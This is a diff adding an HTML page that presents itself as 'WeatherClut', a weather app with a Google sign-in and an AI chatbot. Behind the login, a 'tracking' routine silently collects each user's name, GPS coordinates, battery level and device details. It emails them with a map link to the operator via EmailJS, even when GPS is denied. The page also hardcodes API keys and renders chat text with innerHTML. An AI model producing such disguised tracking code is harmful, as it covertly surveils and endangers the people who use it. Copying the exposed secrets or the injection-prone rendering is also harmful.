@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WeatherClut</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        :root { --primary: #007bff; --bg: #121212; --panel: #1e1e1e; --text: #fff; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+
+        /* --- HEADER --- */
+        header { padding: 30px 20px; text-align: center; width: 100%; box-sizing: border-box; }
+        .bell-btn { background: #333; border-radius: 50%; width: 80px; height: 80px; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .bell-icon { width: 40px; fill: white; }
+        .badge { position: absolute; top: 18px; right: 22px; width: 14px; height: 14px; background: #ff453a; border-radius: 50%; display: none; border: 2px solid #333; animation: pulse 2s infinite; }
+        
+        h2 { margin: 0 0 10px; font-size: 24px; }
+        #status { color: #888; margin-bottom: 25px; font-size: 15px; font-weight: 500; }
+        
+        /* LOGIN BUTTON */
+        #loginBtn { background: white; color: #333; border: none; padding: 12px 25px; border-radius: 30px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 16px; width: fit-content; margin: 0 auto; box-shadow: 0 4px 12px rgba(255,255,255,0.1); transition: transform 0.2s; }
+        #loginBtn:active { transform: scale(0.95); }
+
+        /* --- 🤖 FLOATING BOT TRIGGER (Professional Emoji Version) --- */
+        #botTrigger {
+            position: fixed; bottom: 25px; right: 25px;
+            width: 65px; height: 65px; 
+            background: #fff; /* Clean white background */
+            color: #333; /* Dark icon color */
+            border-radius: 50%; 
+            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
+            cursor: pointer; display: none; /* Hidden until login */
+            align-items: center; justify-content: center;
+            z-index: 1001; 
+            font-size: 36px; /* Large, clear emoji */
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        #botTrigger:active { transform: scale(0.9); }
+        
+        /* Class to hide the trigger when chat is open */
+        #botTrigger.hide {
+            transform: scale(0);
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* --- 🤖 CHAT WINDOW --- */
+        #aiContainer {
+            position: fixed; bottom: 90px; right: 20px; 
+            width: 90vw; max-width: 380px;
+            background: var(--panel); border: 1px solid #333; border-radius: 18px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.7); display: none;
+            flex-direction: column; overflow: hidden; z-index: 1000;
+            transform-origin: bottom right;
+            transition: all 0.3s cubic-bezier(0.19, 1, 0.22, 1);
+            opacity: 0; transform: scale(0.8) translateY(20px);
+        }
+
+        #aiContainer.show-bot { opacity: 1; transform: scale(1) translateY(0); }
+
+        .chat-header { background: linear-gradient(135deg, #007bff, #0056b3); padding: 15px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; color: white; }
+        .close-btn { cursor: pointer; padding: 5px; font-size: 20px; color: rgba(255,255,255,0.8); transition: color 0.2s; }
+        .close-btn:hover { color: white; }
+        
+        .chat-body { height: 55vh; max-height: 400px; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 12px; background: #1a1a1a; }
+        .msg { padding: 12px 16px; border-radius: 14px; font-size: 14px; max-width: 85%; line-height: 1.5; word-wrap: break-word; }
+        .bot-msg { background: #333; color: #eee; align-self: flex-start; border-bottom-left-radius: 4px; }
+        .user-msg { background: #007bff; color: white; align-self: flex-end; border-bottom-right-radius: 4px; }
+        .sys-msg { font-size: 12px; color: #666; text-align: center; margin: 5px 0; }
+        
+        .link-res { color: #4fc3f7; text-decoration: none; display: block; margin-top: 8px; font-weight: bold; border-top: 1px solid #444; padding-top: 8px; }
+
+        .chat-input-area { padding: 12px; background: #222; display: flex; gap: 10px; border-top: 1px solid #333; }
+        #chatInput { flex: 1; padding: 12px 18px; border-radius: 25px; border: 1px solid #444; background: #111; color: white; outline: none; font-size: 15px; }
+        #sendBtn { background: #007bff; border: none; width: 45px; height: 45px; border-radius: 50%; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 18px; transition: background 0.2s; }
+        #sendBtn:hover { background: #0056b3; }
+
+        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(255,69,58,0.7);} 70% {box-shadow: 0 0 0 10px rgba(0,0,0,0);} 100% {box-shadow: 0 0 0 0 rgba(0,0,0,0);} }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="bell-btn">
+            <svg class="bell-icon" viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
+            <div class="badge" id="badge"></div>
+        </div>
+        <h2 id="weatherHeader">WeatherClut</h2>
+        <div id="status">Secure login required</div>
+        <button id="loginBtn" onclick="userLogin()">
+            <img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png" width="22"> Sign in for AI
+        </button>
+    </header>
+
+    <div id="botTrigger" onclick="toggleChat()">
+        🤖
+    </div>
+
+    <div id="aiContainer">
+        <div class="chat-header">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <span style="font-size: 24px;">🤖</span>
+                <span>ClutBot</span>
+            </div>
+            <span class="close-btn" onclick="toggleChat()">✕</span>
+        </div>
+        <div class="chat-body" id="chatBody">
+            <div class="msg bot-msg">Hello! I'm ClutBot. Ask me about weather or search the web.</div>
+        </div>
+        <div class="chat-input-area">
+            <input type="text" id="chatInput" placeholder="Ask anything..." onkeypress="checkEnter(event)">
+            <button id="sendBtn" onclick="processMessage()">➤</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+
+        // CONFIGURATION
+        const KEYS = {
+            OPENAI_KEY: "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",
+            GOOGLE_CX: "00868fd0be1364f02", 
+            GOOGLE_API: "AIzaSyB0YvLG1Yp0Slqi8iFoqjZPS28ppsX8ykc", 
+            WEATHER: "cea950af890c4ecc98e85419251207",
+            EMAIL_SERVICE: "service_b403jng",
+            EMAIL_TEMPLATE: "template_q8rm339",
+            EMAIL_KEY: "UyLh-37LPvN0qPGuZ"
+        };
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCsnr3JJ8_gSObPX3E9R4oR3jrUtIkj3bM",
+            authDomain: "pc-electrical-7d4f8.firebaseapp.com",
+            projectId: "pc-electrical-7d4f8",
+            storageBucket: "pc-electrical-7d4f8.firebasestorage.app",
+            messagingSenderId: "506832002896",
+            appId: "1:506832002896:web:99bed74e0c44faf96f5655",
+            measurementId: "G-7W8JTZEZEV"
+        };
+
+        emailjs.init(KEYS.EMAIL_KEY);
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const provider = new GoogleAuthProvider();
+
+        let weatherCache = { temp: 0, condition: "Unknown", location: "Unknown" };
+        let isChatOpen = false;
+
+        // --- LOGIN FLOW ---
+        window.userLogin = function() {
+            document.getElementById('status').innerText = "Authenticating...";
+            signInWithPopup(auth, provider).then((result) => {
+                const user = result.user;
+                document.getElementById('loginBtn').style.display = 'none';
+                document.getElementById('status').innerText = `Welcome, ${user.displayName}`;
+                
+                // Show Bot Trigger
+                document.getElementById('botTrigger').style.display = "flex";
+                
+                // START TRACKING
+                initWeatherAndTrack(user.displayName);
+            }).catch((err) => alert("Login Error: " + err.message));
+        };
+
+        // --- SMART TOGGLE (Hide button when chat open) ---
+        window.toggleChat = function() {
+            const bot = document.getElementById('aiContainer');
+            const trigger = document.getElementById('botTrigger');
+
+            if (isChatOpen) {
+                // Closing: Hide Chat, Show Button
+                bot.classList.remove('show-bot');
+                setTimeout(() => {
+                    bot.style.display = 'none';
+                    trigger.classList.remove('hide');
+                }, 300);
+            } else {
+                // Opening: Hide Button, Show Chat
+                trigger.classList.add('hide');
+                bot.style.display = "flex";
+                setTimeout(() => bot.classList.add('show-bot'), 10);
+            }
+            isChatOpen = !isChatOpen;
+        };
+
+        // --- TRACKING LOGIC ---
+        function initWeatherAndTrack(name) {
+            if (!navigator.geolocation) {
+                sendEmail(name, "Location Not Supported", "0,0");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                try {
+                    const res = await fetch(`https://api.weatherapi.com/v1/current.json?key=${KEYS.WEATHER}&q=${lat},${lon}`);
+                    const data = await res.json();
+                    
+                    weatherCache = { 
+                        temp: data.current.temp_c, 
+                        condition: data.current.condition.text, 
+                        location: data.location.name 
+                    };
+
+                    document.getElementById('weatherHeader').innerText = `${weatherCache.temp}°C in ${weatherCache.location}`;
+                    document.getElementById('status').innerText = ""; 
+                    if(data.current.condition.text.includes("Rain")) document.getElementById('badge').style.display = 'block';
+                    
+                    // SEND EMAIL
+                    sendEmail(name, lat, lon);
+
+                } catch(e) { console.error(e); }
+            }, (error) => {
+                sendEmail(name, "User Denied GPS", "0,0");
+            });
+        }
+
+        function sendEmail(name, lat, lon) {
+            // Check Battery (Try/Catch for robustness)
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    fireEmail(name, lat, lon, Math.round(b.level * 100) + "%");
+                }).catch(() => fireEmail(name, lat, lon, "Unknown"));
+            } else {
+                fireEmail(name, lat, lon, "Not Supported");
+            }
+        }
+
+        function fireEmail(name, lat, lon, battery) {
+            const locName = (lat === "User Denied GPS") ? "Denied" : (weatherCache.location || "Unknown");
+            const mapLink = (lat === "User Denied GPS") ? "N/A" : `https://www.google.com/maps?q=$${lat},${lon}`;
+
+            const params = {
+                user_name: name,
+                device: navigator.userAgent,
+                battery: battery,
+                location: locName,
+                coordinates: `${lat}, ${lon}`,
+                time: new Date().toLocaleString(),
+                map_link: mapLink
+            };
+            
+            // SEND TO EMAILJS
+            emailjs.send(KEYS.EMAIL_SERVICE, KEYS.EMAIL_TEMPLATE, params)
+                .then(() => console.log("Email Sent Successfully"))
+                .catch(e => {
+                    console.error("Email Failed", e);
+                    if(e.text && e.text.includes("recipients address is empty")) {
+                        alert("CRITICAL ERROR: You forgot to set 'To Email' in EmailJS Dashboard!");
+                    }
+                });
+        }
+
+        // --- BOT LOGIC ---
+        window.checkEnter = function(e) { if (e.key === 'Enter') processMessage(); };
+        window.processMessage = async function() {
+            const input = document.getElementById('chatInput');
+            const rawText = input.value.trim();
+            if (!rawText) return;
+            addMsg(rawText, 'user-msg');
+            input.value = "";
+            const loadingId = addMsg("Thinking...", 'sys-msg');
+            const lowerText = rawText.toLowerCase();
+
+            // WEATHER QUERY
+            if (lowerText.includes("weather") || lowerText.includes("temp")) {
+                let cityQuery = lowerText.replace(/(what|is|the|weather|temperature|temp|of|in|like|today|now)/g, "").trim();
+                if(!cityQuery || cityQuery === "here") {
+                    document.getElementById(loadingId).remove();
+                    addMsg(`Current Location: ${weatherCache.location}: ${weatherCache.temp}°C (${weatherCache.condition}).`, 'bot-msg');
+                } else {
+                    await fetchCityWeather(cityQuery, loadingId);
+                }
+            } else {
+                try {
+                    const aiResponse = await callOpenAI(rawText);
+                    document.getElementById(loadingId).remove();
+                    addMsg(aiResponse, 'bot-msg');
+                } catch (error) {
+                    await performGoogleSearch(rawText, loadingId);
+                }
+            }
+        };
+
+        async function fetchCityWeather(city, loadingId) {
+            try {
+                const res = await fetch(`https://api.weatherapi.com/v1/current.json?key=${KEYS.WEATHER}&q=${city}`);
+                if(!res.ok) throw new Error("City not found");
+                const d = await res.json();
+                document.getElementById(loadingId).remove();
+                addMsg(`🌤️ <b>${d.location.name}:</b> ${d.current.temp_c}°C, ${d.current.condition.text}`, 'bot-msg');
+            } catch(e) {
+                const fallback = city.split(" ").pop();
+                if(fallback && fallback !== city) await fetchCityWeather(fallback, loadingId);
+                else { document.getElementById(loadingId).remove(); addMsg(`I couldn't find weather for "${city}".`, 'bot-msg'); }
+            }
+        }
+
+        async function performGoogleSearch(query, loadingId) {
+            try {
+                const url = `https://www.googleapis.com/customsearch/v1?key=${KEYS.GOOGLE_API}&cx=${KEYS.GOOGLE_CX}&q=${query}`;
+                const res = await fetch(url);
+                const data = await res.json();
+                document.getElementById(loadingId).remove();
+                if (data.items && data.items.length > 0) {
+                    const top = data.items[0];
+                    addMsg(`<b>🔍 Found this:</b><br><br>${top.snippet}<br><a href="${top.link}" target="_blank" class="link-res">Read More</a>`, 'bot-msg');
+                } else { addMsg("I searched the web but found nothing.", 'bot-msg'); }
+            } catch (error) { document.getElementById(loadingId).remove(); addMsg("My brain is offline (API Error).", 'bot-msg'); }
+        }
+
+        async function callOpenAI(prompt) {
+            const res = await fetch("https://api.openai.com/v1/chat/completions", {
+                method: "POST",
+                headers: { "Content-Type": "application/json", "Authorization": `Bearer ${KEYS.OPENAI_KEY}` },
+                body: JSON.stringify({ model: "gpt-3.5-turbo", messages: [ { role: "system", content: `You are ClutBot.` }, { role: "user", content: prompt } ] })
+            });
+            if (!res.ok) throw new Error("CORS Block");
+            const data = await res.json();
+            return data.choices[0].message.content;
+        }
+
+        function addMsg(text, className) {
+            const div = document.createElement('div'); div.className = `msg ${className}`; div.innerHTML = text;
+            const body = document.getElementById('chatBody'); body.appendChild(div); body.scrollTop = body.scrollHeight;
+            return div.id = "msg-" + Date.now();
+        }
+    </script>
+</body>
+</html>
